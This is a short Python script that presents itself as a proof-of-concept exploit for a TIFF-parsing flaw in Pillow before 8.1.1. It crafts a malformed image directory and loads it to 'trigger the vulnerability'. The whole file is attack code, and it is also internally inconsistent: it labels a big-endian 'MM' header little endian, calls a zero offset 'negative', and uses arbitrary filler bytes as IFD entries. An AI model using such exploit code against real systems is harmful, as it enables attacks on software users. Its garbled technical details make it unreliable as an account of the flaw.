from PIL import Image # Pillow < 8.1.1
import io

# Create a TIFF image with a maliciously crafted IFD (Image File Directory)
ifd = bytearray(b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x20')
ifd += b'\x00\x00\x00\x00'  # Offset to the next IFD (negative offset)
ifd += b'\x00\x00\x00\x10'  # Size of the next IFD (invalid size)

# Create a TIFF image from the malicious IFD
# The frombytes method is not suitable for creating a TIFF image from a raw IFD.
# We need to construct a valid TIFF header and then append the malicious IFD.
# Let's create a minimal TIFF header
tiff_header = bytearray(b'MM\x2a\x00') # TIFF little endian header, magic number 42
first_ifd_offset = 8 # After the header
tiff_header += first_ifd_offset.to_bytes(4, 'little')
tiff_data = tiff_header + ifd

image = Image.open(io.BytesIO(tiff_data))


# Try to decode the image, which will trigger the vulnerability
try:
    image.load()
except Exception as e:
  print(f"Caught expected exception: {e}")